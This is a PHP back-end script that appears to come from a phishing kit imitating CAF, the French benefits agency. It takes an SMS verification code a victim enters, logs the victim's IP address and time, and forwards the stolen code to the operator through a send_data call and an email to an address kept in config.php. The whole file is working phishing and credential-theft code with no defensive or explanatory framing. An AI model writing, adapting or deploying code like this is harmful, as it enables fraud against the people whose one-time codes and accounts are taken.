<?php
date_default_timezone_set('GMT');
$TIME    = date("d-m-Y H:i:s");
$browser = getenv ("HTTP_USER_AGENT");
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;
require 'PHPMailer-master/src/Exception.php';
require 'PHPMailer-master/src/PHPMailer.php';
require 'PHPMailer-master/src/SMTP.php';
function getUserIP() {

    $ipaddress = '';

    if (isset($_SERVER['HTTP_CLIENT_IP']))

        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];

    else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))

        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];

    else if(isset($_SERVER['HTTP_X_FORWARDED']))

        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];

    else if(isset($_SERVER['HTTP_X_CLUSTER_CLIENT_IP']))

        $ipaddress = $_SERVER['HTTP_X_CLUSTER_CLIENT_IP'];

    else if(isset($_SERVER['HTTP_FORWARDED_FOR']))

        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];

    else if(isset($_SERVER['HTTP_FORWARDED']))

        $ipaddress = $_SERVER['HTTP_FORWARDED'];

    else if(isset($_SERVER['REMOTE_ADDR']))

        $ipaddress = $_SERVER['REMOTE_ADDR'];

    else

        $ipaddress = 'UNKNOWN';

    return $ipaddress;

} 
  $info_names = array(

  "IDENTIFIANT" => "user_id",
  "ID PASSWORD" => "pass_id"
  );
  include("config.php");
$ip= getUserIP();
    $message =  "<br>--------------------------------------------------------------<br>";
    $message .= "<br>";
    $message .= "<br><abbr style='color:green;'>====================+[ NEW CAF SMS " .$ip." ]+====================</abbr><br>";
    $message .= "SMS               : ".$_REQUEST['sms']."<br>";
    $message .= "--------------------<br>";
    $message .= "Time              : $TIME<br>";
    $message .= "IP                : ".$ip."<br>";
    $message .= "<br>";
    $message .= "<br>--------------------------------------------------------------<br>";

    $mail_message = "\n============+[ NEW CAF SMS " .$ip." ]+============\n";
    $mail_message .= "\n";
    $mail_message .= "SMS               : ".$_REQUEST['sms']."\n";
    $mail_message .= "\n";
    $mail_message .= "--------------------\n";
    $mail_message .= "\n";
    $mail_message .= "Time              : $TIME\n";
    $mail_message .= "IP                : ".$ip."\n";
    $mail_message .= "\n";
    $mail_message .= "\n========================\n";

  $res = send_data(['data'=>$message]);

  mail($emailTo,"New CAF SMS \t". $ip,$mail_message,$headers);

  echo json_encode(['status'=>'success']);



?>